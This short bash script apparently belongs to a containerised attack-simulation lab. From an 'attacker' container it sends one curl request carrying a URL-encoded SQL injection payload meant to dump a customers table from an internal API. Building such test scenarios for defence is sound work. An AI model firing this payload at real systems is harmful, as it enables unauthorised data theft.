#!/bin/bash

echo "Starting Attack Scenario 4: SQL Injection Attempt"

# Simulate an SQL injection attack
docker exec attacker bash -c "echo 'Attempting SQL injection...' && \
  curl -s 'http://172.18.0.40/api/data?id=1%27%20OR%201=1;%20SELECT%20*%20FROM%20customers%20WHERE%20name%20LIKE%20%27%25'"

echo "Attack Scenario 4 Complete"